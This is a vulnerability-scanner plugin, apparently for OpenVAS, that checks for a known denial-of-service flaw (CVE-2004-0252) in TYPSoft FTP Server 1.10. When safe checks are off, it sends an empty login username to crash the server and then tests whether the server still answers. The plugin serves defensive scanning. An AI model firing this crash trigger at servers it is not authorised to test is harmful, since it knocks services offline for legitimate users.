if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14707" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2004-0252" );
	script_bugtraq_id( 9573 );
	script_xref( name: "OSVDB", value: "6613" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "TYPSoft empty username DoS" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/typsoft/detected" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Use a different FTP server or upgrade to the newest version." );
	script_tag( name: "summary", value: "The remote host seems to be running TYPSoft FTP server, version 1.10.

  This version is prone to a remote denial of service flaw." );
	script_tag( name: "impact", value: "By sending an empty login username, an attacker can cause the ftp server
  to crash, denying service to legitimate users." );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
kb_creds = ftp_get_kb_creds();
login = "";
pass = kb_creds["pass"];
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "TYPSoft FTP Server" )){
	exit( 0 );
}
if( safe_checks() ){
	if(egrep( pattern: ".*TYPSoft FTP Server (1\\.10[^0-9])", string: banner )){
		security_message( port );
	}
	exit( 0 );
}
else {
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	if(ftp_authenticate( socket: soc, user: login, pass: pass )){
		sleep( 1 );
		soc2 = open_sock_tcp( port );
		if( !soc2 || !recv_line( socket: soc2, length: 4096 ) ) {
			security_message( port );
		}
		else {
			close( soc2 );
		}
		close( soc );
	}
}
exit( 0 );

